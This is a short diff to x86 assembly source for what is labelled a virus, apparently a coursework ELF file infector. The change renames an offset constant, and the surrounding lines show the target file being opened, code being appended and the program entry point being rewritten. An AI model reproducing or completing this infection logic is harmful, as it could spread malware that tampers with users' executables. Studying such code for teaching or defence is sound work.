@@ -184,7 +184,7 @@
 
 %macro get_loc 1
 	call get_my_loc
-	sub dword [ebp - 12],  next_i - %1
+	sub dword [ebp - LABEL_OFF],  next_i - %1
 %endmacro
 
 %define	STK_RES	200
@@ -200,7 +200,7 @@
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
 %define ELFHD_offset 64
-%define PREV_ENTRY_OFF 68
+%define FILE_SIZE_OFF 68
 %define MAGIC1 7
 %define MAGIC2 6
 %define MAGIC3 5
@@ -239,7 +239,7 @@ _start:	push	ebp
 	jne virus_fail
 
 	lseek [ebp - FILE_DESC_OFF], 0, SEEK_END
-	mov dword [ebp - PREV_ENTRY_OFF], eax
+	mov dword [ebp - FILE_SIZE_OFF], eax
 	get_loc _start
 	mov ecx, [ebp - LABEL_OFF]
 	get_loc virus_end
@@ -256,7 +256,7 @@ _start:	push	ebp
 	lea eax, [ebp - ENTRY_OFF]
 	write [ebp - FILE_DESC_OFF], eax, 4
 
-	mov eax, dword [ebp - PREV_ENTRY_OFF]
+	mov eax, dword [ebp - FILE_SIZE_OFF]
 	mov dword [ebp - ENTRY_OFF], 0x08048000
 	add dword [ebp - ENTRY_OFF], eax
 	lseek [ebp - FILE_DESC_OFF], 0, SEEK_SET
